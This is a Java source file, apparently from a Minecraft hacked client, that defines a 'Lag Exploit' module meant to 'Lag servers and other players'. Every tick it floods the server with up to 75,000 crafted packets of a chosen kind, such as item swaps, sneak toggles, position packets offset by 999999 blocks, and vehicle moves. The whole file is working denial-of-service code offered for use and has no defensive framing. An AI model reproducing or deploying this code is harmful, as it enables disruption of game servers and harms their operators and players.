package com.backdoored.hacks.exploit;

import com.backdoored.hacks.*;
import a.a.g.b.*;
import com.backdoored.gui.*;
import a.a.g.b.d.*;
import com.backdoored.setting.*;
import net.minecraft.network.*;
import net.minecraft.entity.*;
import net.minecraft.inventory.*;
import net.minecraft.entity.player.*;
import net.minecraft.util.*;
import com.backdoored.utils.*;
import net.minecraft.network.play.client.*;
import net.minecraft.util.math.*;

@b.a(name = "Lag Exploit", description = "Lag servers and other players", category = CategoriesInit.EXPLOIT)
public class LagExploit extends BaseHack
{
    private Setting<g.a> type;
    private Setting<Integer> pc;
    
    public LagExploit() {
        super();
        this.type = new EnumSetting<g.a>("Type", (BaseHack)this, (Enum)g.a.os);
        this.pc = new IntegerSetting("Frequency", this, 5000, 1, 75000);
    }
    
    public void onTick() {
        if (!this.getEnabled()) {
            return;
        }
        for (int i = 0; i < this.pc.getValInt(); ++i) {
            if (this.type.getValInt() == g.a.os) {
                a((Packet)new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS, LagExploit.mc.player.getPosition(), EnumFacing.UP));
            }
            if (this.type.getValInt() == g.a.ot) {
                a((Packet)new CPacketEntityAction((Entity)LagExploit.mc.player, CPacketEntityAction.Action.START_SNEAKING));
                a((Packet)new CPacketEntityAction((Entity)LagExploit.mc.player, CPacketEntityAction.Action.STOP_SNEAKING));
            }
            if (this.type.getValInt() == g.a.ou) {
                final Vec3d positionVector = LagExploit.mc.player.getPositionVector();
                a((Packet)new CPacketPlayer.Position(positionVector.x, positionVector.y + 999999.0, positionVector.z, LagExploit.mc.player.onGround));
                a((Packet)new CPacketPlayer.Position(positionVector.x, positionVector.y - 999999.0, positionVector.z, LagExploit.mc.player.onGround));
            }
            if (this.type.getValInt() == g.a.ov) {
                LagExploit.mc.playerController.windowClick(0, 0, 0, ClickType.PICKUP_ALL, (EntityPlayer)LagExploit.mc.player);
            }
            if (this.type.getValInt() == g.a.ow) {
                a((Packet)new CPacketHeldItemChange(0));
                a((Packet)new CPacketHeldItemChange(1));
            }
            if (this.type.getValInt() == g.a.ox) {
                a((Packet)new CPacketPlayerTryUseItem());
                a((Packet)new CPacketPlayerTryUseItemOnBlock(LagExploit.mc.player.getPosition(), LagExploit.mc.player.getHorizontalFacing(), LagExploit.mc.player.getActiveHand(), 0.0f, 0.0f, 0.0f));
            }
            if (this.type.getValInt() == g.a.oy) {
                a((Packet)new CPacketAnimation(EnumHand.MAIN_HAND));
            }
            if (this.type.getValInt() == g.a.oz) {
                final Entity ridingEntity = LagExploit.mc.player.getRidingEntity();
                if (ridingEntity == null) {
                    Utils.printMessage("Entity Movement lag needs you to be riding an entity!", "red");
                    this.setEnabled(false);
                    return;
                }
                ridingEntity.posX = LagExploit.mc.player.posX;
                ridingEntity.posY = LagExploit.mc.player.posY + 1330.0;
                ridingEntity.posZ = LagExploit.mc.player.posZ;
                a((Packet)new CPacketVehicleMove(ridingEntity));
            }
        }
    }
    
    private static void a(final Packet packet) {
        LagExploit.mc.player.connection.sendPacket(packet);
    }
}
